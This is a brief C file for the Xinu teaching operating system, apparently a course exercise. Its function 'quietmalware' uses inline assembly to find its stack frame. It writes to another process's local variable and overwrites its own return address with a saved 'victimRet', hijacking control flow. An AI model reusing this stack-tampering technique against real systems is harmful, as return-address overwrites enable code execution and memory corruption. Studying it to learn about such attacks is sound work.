#include <xinu.h>

extern unsigned long victimRet;

void quietmalware(void){
	unsigned long * myBP;			// My base pointer
	unsigned long * myRet;			// My Return address
	asm("movl %%ebp, %0"			// Copy ebp onto myBP to get base pointer
		:"=r"(myBP));
	unsigned long * myNewX = *myBP + 68;	// Move the address to address of local variable x in memory
	*myNewX = 9;				// Set the x value in memory to 9
	myRet = myBP+1;				// Get address of return address
	*myRet = victimRet;			// Change my return address to where the victim is supposed to return
	return;
}
